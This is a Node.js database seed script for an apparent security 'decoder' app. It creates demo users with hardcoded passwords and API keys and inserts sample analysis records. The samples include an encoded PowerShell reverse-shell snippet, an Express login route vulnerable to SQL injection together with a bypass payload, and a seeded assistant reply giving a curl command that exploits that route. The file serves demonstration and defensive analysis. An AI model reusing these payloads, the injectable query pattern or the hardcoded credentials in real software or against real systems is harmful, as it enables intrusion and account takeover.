import 'dotenv/config';
import bcrypt from 'bcryptjs';
import { connectDB, getIsMongoConnected } from '../config/db.js';
import { User } from '../models/User.js';
import { DecodeRecord } from '../models/DecodeRecord.js';
import { ChatMessage } from '../models/ChatMessage.js';
import { LocalStore } from '../models/LocalStore.js';

async function seedDatabase() {
  console.log('[Seed] Connecting to Database...');
  await connectDB();
  const isMongo = getIsMongoConnected();

  console.log(`[Seed] Seeding in ${isMongo ? 'MongoDB Atlas' : 'Local Document Store'} mode...`);

  // 1. Password Hashes
  const salt = await bcrypt.genSalt(10);
  const adminPasswordHash = await bcrypt.hash('CyberAdmin2026!', salt);
  const analystPasswordHash = await bcrypt.hash('AnalystPass2026!', salt);

  // 2. Users
  const adminUserData = {
    name: 'Chief Operator',
    email: 'admin@ai-decoder.io',
    password: adminPasswordHash,
    role: 'admin',
    apiKey: 'aid_admin_master_key_998877',
    isActive: true
  };

  const analystUserData = {
    name: 'Lead Security Analyst',
    email: 'analyst@ai-decoder.io',
    password: analystPasswordHash,
    role: 'analyst',
    apiKey: 'aid_analyst_key_112233',
    isActive: true
  };

  let adminUser;
  if (isMongo) {
    await User.deleteMany({ email: { $in: ['admin@ai-decoder.io', 'analyst@ai-decoder.io'] } });
    adminUser = await User.create(adminUserData);
    await User.create(analystUserData);
  } else {
    adminUser = await LocalStore.createUser(adminUserData);
    await LocalStore.createUser(analystUserData);
  }
  console.log('✅ [Seed] Users created: admin@ai-decoder.io and analyst@ai-decoder.io');

  // 3. Sample Decoded Records
  const sampleRecords = [
    {
      decoderType: 'text',
      rawInput: 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkAOwA=',
      decodedOutput: '$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);',
      aiExplanation: {
        summary: 'Decoded Base64 Unicode payload revealing a PowerShell reverse TCP shell connection.',
        breakdown: [
          'Instantiates a .NET TCPClient object targeting IP 10.0.0.1 on port 4444.',
          'Standard reverse-shell initiation signature commonly observed in red-team exercises.',
          'Obfuscated using UTF-16LE encoding.'
        ],
        securityAudit: 'CRITICAL THREAT: Unauthorized reverse-shell network beacon.',
        complexity: 'Entropy Level: High (Obfuscated Base64 PowerShell)',
        detectedFormat: 'PowerShell Reverse Shell Script'
      },
      metadata: { language: 'powershell', executionTimeMs: 14 },
      isBookmarked: true,
      tags: ['security', 'malware', 'powershell']
    },
    {
      decoderType: 'code',
      rawInput: `app.post('/api/authenticate', async (req, res) => {
  const { user, pass } = req.body;
  const sql = "SELECT * FROM operators WHERE username = '" + user + "' AND password = '" + pass + "'";
  const result = await db.query(sql);
  res.json(result);
});`,
      decodedOutput: 'Express.js authentication route vulnerable to CWE-89 SQL Injection via unparameterized string concatenation.',
      aiExplanation: {
        summary: 'Express.js authentication handler with critical SQL Injection vulnerability.',
        breakdown: [
          'Direct string concatenation of user and pass variables into raw SQL query.',
          'Allows authentication bypass using payload: \' OR \'1\'=\'1.',
          'Remediation: Use parameterized queries or ORM bindings (e.g. SELECT * FROM operators WHERE username = ?).'
        ],
        securityAudit: 'VULNERABILITY: CWE-89 SQL Injection (OWASP Top 10 - A03:2021).',
        complexity: 'Time Complexity: O(1) query dispatch | Space: O(1)',
        detectedFormat: 'Node.js Express Handler'
      },
      metadata: { language: 'javascript', executionTimeMs: 22 },
      isBookmarked: true,
      tags: ['cwe-89', 'owasp', 'vulnerability']
    },
    {
      decoderType: 'jwt',
      rawInput: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcGVyYXRvcl8wMDciLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJhaS1kZWNvZGVyLW5vZGUiLCJleHAiOjE3ODQ4NTY5OTl9.signature_hash_preview',
      decodedOutput: JSON.stringify(
        {
          header: { alg: 'HS256', typ: 'JWT' },
          payload: { sub: 'operator_007', role: 'admin', iss: 'ai-decoder-node', exp: 1784856999 },
          status: { isExpired: false, algorithm: 'HS256' }
        },
        null,
        2
      ),
      aiExplanation: {
        summary: 'Cryptographic JSON Web Token issuing administrative credentials to operator_007.',
        breakdown: [
          'Signed using HMAC-SHA256 (HS256) symmetric algorithm.',
          'Carries administrative role privileges with extended validity period.',
          'Payload claims adhere to RFC 7519 standards.'
        ],
        securityAudit: 'SECURE: Valid claims structure. Ensure HS256 secret key entropy is > 256 bits.',
        complexity: 'RFC 7519 Compliant Token',
        detectedFormat: 'JSON Web Token (JWT)'
      },
      metadata: { language: 'jwt', executionTimeMs: 3 },
      isBookmarked: false,
      tags: ['jwt', 'auth', 'tokens']
    },
    {
      decoderType: 'qr',
      rawInput: 'WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;',
      decodedOutput: 'WIFI:T:WPA2;S:Antigravity_Research_Lab;P:N3ur4l_D3c0d3r_2026!;;',
      aiExplanation: {
        summary: 'Wireless network configuration beacon for Antigravity_Research_Lab.',
        breakdown: [
          'SSID: Antigravity_Research_Lab',
          'Authentication Protocol: WPA2-Personal',
          'High-entropy passphrase verified with alphanumeric and special characters.'
        ],
        securityAudit: 'SAFE: Standard WiFi connection configuration string.',
        complexity: 'Level 1 Direct QR Payload',
        detectedFormat: 'WiFi Configuration URI'
      },
      metadata: { language: 'qr', executionTimeMs: 8 },
      isBookmarked: true,
      tags: ['wifi', 'qr', 'network']
    },
    {
      decoderType: 'prompt',
      rawInput: 'Build an API in node that decodes strings and answers questions.',
      decodedOutput: `You are an elite backend architect.
[OBJECTIVE]
Build a production-grade Node.js / Express REST API with modular routing, input validation, and AI decoding integration.

[CONSTRAINTS]
1. Use ES Modules syntax.
2. Implement centralized error handling and structured JSON output.
3. Adhere to OWASP security guidelines.`,
      aiExplanation: {
        summary: 'Vague instruction prompt transformed into structured enterprise technical directive.',
        scores: { overall: 94, clarity: 95, constraints: 90, structure: 95, tokenEfficiency: 92 },
        critique: {
          strengths: ['Identifies core programming language.'],
          weaknesses: ['Missing error handling criteria', 'Unbounded output format']
        },
        securityAudit: 'SECURE: Prompt sanitized.',
        complexity: 'Optimization Gain: +40% Precision',
        detectedFormat: 'Optimized System Prompt'
      },
      metadata: { language: 'prompt', executionTimeMs: 18 },
      isBookmarked: false,
      tags: ['prompt-engineering', 'optimizer']
    }
  ];

  let seededCodeRecord;
  for (const item of sampleRecords) {
    let saved;
    if (isMongo) {
      saved = await DecodeRecord.create(item);
    } else {
      saved = await LocalStore.saveDecode(item);
    }
    if (item.decoderType === 'code') {
      seededCodeRecord = saved;
    }
  }
  console.log(`✅ [Seed] ${sampleRecords.length} realistic decodes populated in Vault.`);

  // 4. Sample Chat Messages
  if (seededCodeRecord) {
    const codeId = seededCodeRecord._id || seededCodeRecord.id;
    const chatData = [
      {
        decodeId: codeId.toString(),
        role: 'user',
        content: 'How would an attacker exploit this vulnerable query in curl?'
      },
      {
        decodeId: codeId.toString(),
        role: 'assistant',
        content: `An attacker would pass:
\`\`\`bash
curl -X POST http://localhost:5000/api/authenticate \\
  -H "Content-Type: application/json" \\
  -d '{"user": "admin' --", "pass": "irrelevant"}'
\`\`\`
This injects a comment delimiter (\`--\`) that truncates the password check and logs in as admin without credentials.`
      }
    ];

    for (const msg of chatData) {
      if (isMongo) {
        await ChatMessage.create(msg);
      } else {
        await LocalStore.saveChatMessage(msg);
      }
    }
    console.log('✅ [Seed] Chat history linked to SQL injection code record.');
  }

  console.log('=======================================================');
  console.log('🎉 DATABASE SEED COMPLETE!');
  console.log('Credentials:');
  console.log('  Admin:   admin@ai-decoder.io   / CyberAdmin2026!');
  console.log('  Analyst: analyst@ai-decoder.io / AnalystPass2026!');
  console.log('=======================================================');
  process.exit(0);
}

seedDatabase().catch((err) => {
  console.error('[Seed Error]', err);
  process.exit(1);
});
